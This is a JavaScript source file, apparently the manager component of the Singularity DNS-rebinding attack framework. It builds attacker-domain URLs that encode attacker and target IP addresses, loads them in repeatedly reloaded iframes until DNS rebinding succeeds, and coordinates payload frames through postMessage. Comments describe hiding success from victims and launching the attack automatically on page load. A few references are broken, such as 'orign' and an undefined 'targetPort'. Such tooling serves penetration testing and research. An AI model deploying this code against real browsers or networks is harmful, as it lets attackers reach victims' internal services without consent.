/* Attack Management */

const Payload = () => {
    let name = null;
    let ports = [];
    return {
        getName() {
            return name;
        },
        getPorts() {
            return ports;
        },
        init(n, p) {
            name = n;
            ports = p;
        }
    }
}

const Configuration = () => {
    let type = null; // determine whether we run a manager driven or automated attack
    let automatic = null;
    let delayDOMLoad = null;
    let alertSuccess = null;
    let hideActivity = null;

    let attackPayloads = [];
    let attackHostDomain = null;
    let attackHostIPAddress = null;
    let targetHostIPAddress = null;
    let dummyPort = null;
    let indexToken = null;
    let interval = null;
    let rebindingStrategy = null;
    let flushDns = null;

    let rebindingSuccessFn = null;

    // Obtains URL query parameters value based on name
    // Uses https://stackoverflow.com/questions/901115/how-can-i-get-query-string-values-in-javascript
    //as URLSearchParams API not supported by all browsers
    // Returns `null` if  URL parameter `name` is not present, other its value.
    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, '\\$&');
        let regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, ' '));
    }

    return {
        init(rebindingSuccessCb) {
            // Set URL parameter `startattack` to some value 
            // to automatically start attack upon loading manager.html page
            automatic = getParameterByName("startattack");
            // Set URL parameter `delaydomload` to some value 
            // to delay the browser DOM load event
            // and prevent premature exit of headless browsers
            delayDOMLoad = getParameterByName("delaydomload");
            // Set URL parameter `alertsuccess` to "false"
            // to not present an alert box upon a successful rebinding attack.
            // This may be useful for:
            // * not informing a victim that an attack completed
            // * or to freeze a headless browser forever (unless performing a DoS attack).
            alertSuccess = getParameterByName("alertsuccess");
            type = (window.location.pathname === "/manager.html") ? "manager" : "automatic";
            rebindingSuccessFn = rebindingSuccessCb;
        },
        getType() {
            return type;
        },
        getDelayDOMLoad() {
            return delayDOMLoad;
        },
        getAutomatic() {
            return automatic;
        },
        getAlertSuccess() {
            return alertSuccess;
        },
        getHideActivity() {
            return hideActivity;
        },
        // Fetches manager-config.json and update Configuration object
        getManagerConfiguration() {
            let result = fetch('/manager-config.json')
                .then(function (r) {
                    return r.text()
                })
                .then(function (d) {
                    let config = JSON.parse(d);
                    for (let p of config.attackPayloads) {
                        let myConfigPayload = Payload();
                        myConfigPayload.init(p.name, p.ports);
                        attackPayloads.push(myConfigPayload);
                    }
                    attackHostDomain = config.attackHostDomain;
                    attackHostIPAddress = config.attackHostIPAddress;
                    targetHostIPAddress = config.targetHostIPAddress;
                    dummyPort = config.dummyPort;
                    indexToken = config.indexToken;
                    interval = config.interval;
                    rebindingStrategy = config.rebindingStrategy;
                    flushDns = config.flushDns;
                })
            return result;
        },
        getAttackPayloads() {
            return attackPayloads;
        },
        getAttackHostDomain() {
            return attackHostDomain;
        },
        getAttackHostIPAddress() {
            return attackHostIPAddress;
        },
        getTargetHostIPAddress() {
            return targetHostIPAddress;
        },
        getTargetPort() {
            return targetPort;
        },
        getDummyPort() {
            return dummyPort;
        },
        getIndexToken() {
            return indexToken;
        },
        getInterval() {
            return interval;
        },
        setInterval(i) {
            interval = i;
        },
        getRebindingStrategy() {
            return rebindingStrategy;
        },
        getFlushDns() {
            return flushDns;
        },
        setFlushDns(boolean) {
            flushDns = boolean;
        },
        getRebindingSuccessFn() {
            return rebindingSuccessFn
        },
        setManually(configObject) {
            attackHostIPAddress = configObject.attackHostIPAddress;
            attackHostDomain = configObject.attackHostDomain;
            rebindingStrategy = configObject.rebindingStrategy;
            flushDns = configObject.flushDns;
            interval = configObject.interval;
            indexToken = configObject.indexToken;
            hideActivity = configObject.hideActivity;
            delayDOMLoad = configObject.delayDOMLoad;
            rebindingSuccessFn = configObject.rebindingSuccessFn;

            if ((type === "automatic") &&
                (hideActivity === false)) {
                body.style.display = "block"
            }
            if (delayDOMLoad === null) {
                delaydomloadframe.parentNode.removeChild(delaydomloadframe);
            }

        }
    }
}

const Frame = (id, url) => {
    let fmid = id;
    let fmurl = url;
    let timer = null;
    let errorCount = 0;
    return {
        getId() {
            return fmid;
        },
        setURL(val) {
            return url = val;
        },
        getURL() {
            return url;
        },
        getTimer() {
            return timer;
        },
        setTimer(val) {
            return timer = val;
        },
        getErrorCount() {
            return errorCount;
        },
        incrementErrorCount() {
            return errorCount += 1;
        }
    }
};

const FrameManager = () => {
    let nextFrameIdVal = 0;
    let frames = new Map();
    let origins = new Map();
    const nextFrameId = () => {
        return nextFrameIdVal++;
    };
    const origin = (url) => {
        //Does not work in IE11. 
        //const u = new URL(url); 
        // Workaround:
        let u = document.createElement('a');
        let id = Math.random().toString();
        u.setAttribute('href', url);
        u.setAttribute('id', id);
        const o = u.port ? `${u.protocol}//${u.hostname}:${u.port}`: `${u.protocol}//${u.hostname}`;
        u.remove();
        return o;
    };
    return {
        addFrame(url) {
            const frameId = `frame-${nextFrameId().toString()}`;
            frames.set(frameId, Frame(frameId, url));
            origins.set(origin(url), frameId);
            return frameId;
        },
        removeFrame(frameId) {
            const url = frames.get(frameId).getURL();
            origins.delete(origin(url));
            return frames.delete(frameId);
        },
        updateFrame(frameId, url) {
            const oldurl = frames.get(frameId).getURL();
            const neworign = orign(url)
            origins.delete(origin(oldurl));
            origins.set(neworigin, frameId);
            frames.set(frameId, Frame(frameId, url));
        },
        frames() {
            return frames;
        },
        lastFrameId() {
            return nextFrameIdVal === 0 ? null : `frame-${nextFrameIdVal - 1}`;
        },
        frame(id) {
            return frames.get(id);
        },
        getFrameOrigin(origin) {
            return origins.get(origin);
        }
    }
};

// Toggles display of advanced settings.
function toggle() {
    if (advanced.className === "d-block") {
        advanced.className = "d-none"
    } else {
        advanced.className = "d-block"
    }
}

// Requests Singularity to instantiate a new HTTP server on specified port.
function requestPort() {
    putData('/servers', {
            "Port": document.getElementById("targetport").value
        })
        .then(function (data) {
            getHTTPServersConfig().then(function (HTTPServersConfig) {
                document.getElementById("listenports").textContent = HTTPServersConfig.ports;
                document.getElementById("targetport").value = HTTPServersConfig.ports[HTTPServersConfig.ports.length - 1];
            })
        })
        .catch(error => console.error(error))
}

// Requests Singularity to provide list of HTTP servers/ports.
function getHTTPServersConfig() {
    let ports = [];
    return fetch('/servers')
        .then(function (response) {
            return response.json();
        })
        .then(function (myJsonConfig) {

            for (let e of myJsonConfig.ServerInformation) {
                ports.push(e.Port);
            }
            promise = new Promise((resolve, reject) => {
                resolve({
                    ports: ports,
                    AllowDynamicHTTPServers: myJsonConfig.AllowDynamicHTTPServers
                });
            })
            return promise;
        })
}

function putData(url, data) {
    // Default options are marked with *
    return fetch(url, {
            body: JSON.stringify(data),
            method: 'PUT',
        })
        .then(response => response.json())
}

const App = () => {
    let configuration = null;
    let fm = null;
    let hosturl = "http://s-%1-%2-%3-%4-e.%5:%6/%7";

    // Push settings from configuration object (obtained from manager-config.json) to UI.
    function populateManagerConfig() {
        payloadsElement = document.getElementById('payloads');
        for (let p of configuration.getAttackPayloads()) {
            let option = document.createElement('option');
            option.value = p.getName();
            let port = '';
            if (p.getPorts().length > 0) {
                port = ' (default port ' + p.getPorts() + ')';
            }
            option.text = p.getName() + port;
            payloadsElement.add(option, 0);
        }
        document.getElementById('attackhostdomain').value = configuration.getAttackHostDomain();
        document.getElementById('attackhostipaddress').value = configuration.getAttackHostIPAddress();
        document.getElementById('targethostipaddress').value = configuration.getTargetHostIPAddress();
        document.getElementById('dummyport').value = configuration.getDummyPort();
        document.getElementById('indextoken').value = configuration.getIndexToken();
        document.getElementById('interval').value = configuration.getInterval();
        document.getElementById(configuration.getRebindingStrategy()).selected = true;
        document.getElementById('flushdns').checked = configuration.getFlushDns();
    };

    function generateAttackUrl(targetHostIPAddress, targetPort, payload) {
        return hosturl
            .replace("%1", configuration.getAttackHostIPAddress())
            .replace("%2", targetHostIPAddress) // replace(/-/g, '--'))
            .replace("%3", Math.floor(Math.random() * 2 ** 32))
            .replace("%4", configuration.getRebindingStrategy())
            .replace("%5", configuration.getAttackHostDomain())
            .replace("%6", targetPort)
            .replace("%7", payload + "?rnd=" + Math.random())
    };

    return {
        getFrameManager() {
            return fm;
        },
        getConfiguration() {
            return configuration;
        },

        attackTarget(targetHostIPAddress, targetPort, payload) {
            let self = this;
            let fid = self.getFrameManager().addFrame(generateAttackUrl(targetHostIPAddress, targetPort, payload))

            self.addFrameToDOM(self.getFrameManager().frame(fid));
            self.getFrameManager().frame(fid).setTimer(setInterval((() => {
                self.reloadAttackFrame(self.getFrameManager().frame(fid))
            }), parseInt(self.getConfiguration().getInterval()) * 1000));

        },
        init(rebindingSuccessCb) {
            let self = this;

            fm = FrameManager();

            // Configuration
            configuration = Configuration();
            // Initialize defaults settings and settings passed from URL query.
            configuration.init(rebindingSuccessCb);

            // Message handler between Manager and attack frames
            window.addEventListener("message", self.receiveMessage, false);

            if (configuration.getType() === "manager") {

                // Singularity HTTP server settings initialization
                document.addEventListener("DOMContentLoaded", function (event) {
                    let HTTPServersConfig = getHTTPServersConfig().then(function (HTTPServersConfig) {
                        document.getElementById("listenports").textContent = HTTPServersConfig.ports;
                        document.getElementById("targetport").value = HTTPServersConfig.ports[HTTPServersConfig.ports.length - 1];
                        document.getElementById("requestport").disabled = !HTTPServersConfig.AllowDynamicHTTPServers;
                    });

                    // Fetch Manager configuration from Singularity HTTP server
                    let payloadsAndTargets = configuration.getManagerConfiguration();

                    // Once we have our HTTP servers config, payloads and targets
                    Promise.all([HTTPServersConfig, payloadsAndTargets]).then(function (values) {
                        populateManagerConfig();
                        //start attack on page load if ?startattack is set     
                        if (configuration.getAutomatic() !== null) {
                            self.begin();
                        }
                    });
                });
            };
        },
        addFrameToDOM(frame) {
            let f = document.createElement("iframe");
            f.src = frame.getURL();
            f.setAttribute('id', frame.getId());
            //f.setAttribute('style', "display: none");
            document.getElementById("attackframes").appendChild(f);
        },

        // Set src of attackframe
        // thus loading the attack payload before rebinding
        // and accessing the target after rebinding.
        reloadAttackFrame(frame) {
            document.getElementById(frame.getId()).src = frame.getURL();
        },

        // communication handler between manager and attack iframe.
        receiveMessage(msg) {
            console.log("Message received from: ", msg.origin, msg.data.status);

            const fid = fm.getFrameOrigin(msg.origin)
            // If we don't have a frame ID for this message origin, dismiss message.
            if (fid === undefined) {
                return;
            };

            if (msg.data.status == "start") {
                console.log("Iframe reports that attack has started");
                clearInterval(fm.frame(fid).getTimer());
                msg.source.postMessage({
                    cmd: "interval",
                    param: configuration.getInterval()
                }, "*");
                msg.source.postMessage({
                    cmd: "indextoken",
                    param: configuration.getIndexToken()
                }, "*");
                msg.source.postMessage({
                    cmd: "flushdns",
                    param: {hostname: window.location.hostname, flushDns: configuration.getFlushDns()}
                }, "*");
                msg.source.postMessage({
                    cmd: "start",
                    param: null
                }, "*");
            }
            if (msg.data.status == "success") {
                configuration.getRebindingSuccessFn()(msg);
                msg.source.postMessage({
                    cmd: "stop"
                }, "*");
            };

            // Possibly a firewalled or closed port. Possibly a non-HTTP service.
            if (msg.data.status === "error") {
                fm.frame(fid).incrementErrorCount();
                console.log("error");

                if (fm.frame(fid).getErrorCount() == 5) {
                    document.getElementById(fid).contentWindow.postMessage({
                        cmd: "stop"
                    }, "*");
                    console.log("Too many errors. Stopping.");
                }
            }

        },
        // Starts attack
        begin() {
            let self = this;

            const UiInterval = document.getElementById("interval").value;
            configuration.setInterval(UiInterval);

            const UiFlushDns = document.getElementById("flushdns").checked;
            configuration.setFlushDns(UiFlushDns);

            let fid = fm.addFrame(hosturl
                .replace("%1", document.getElementById("attackhostipaddress").value)
                .replace("%2", document.getElementById("targethostipaddress").value.replace(/-/g, '--'))
                .replace("%3", Math.floor(Math.random() * 2 ** 32))
                .replace("%4", document.getElementById("rebindingStrategy").value)
                .replace("%5", document.getElementById("attackhostdomain").value)
                .replace("%6", document.getElementById("targetport").value)
                .replace("%7", document.getElementById("payloads").value) + "?rnd=" + Math.random());

            self.addFrameToDOM(fm.frame(fid));

            message.className = "d-block";
            start.disabled = true;

            fm.frame(fid).setTimer(setInterval((() => {
                self.reloadAttackFrame(fm.frame(fid))
            }), parseInt(UiInterval) * 1000));

            //self.reloadAttackFrame(fm.frame(fid));
        }
    }
}

function rebindingSuccessCb(msg) {
    console.log(`Iframe reports attack successful for ${window.location.hostname}\n${msg.data.response}`);
    if ((app.getConfiguration().getAlertSuccess() !== "false") &&
        (app.getConfiguration().getType() === "manager") &&
        (document.getElementById("payloads").value !== "payload-hook-and-control.html")) {
        alert("Attack Successful: " + document.domain + " " + msg.data.response);
    }

}

// Start
const app = App();
app.init(rebindingSuccessCb);

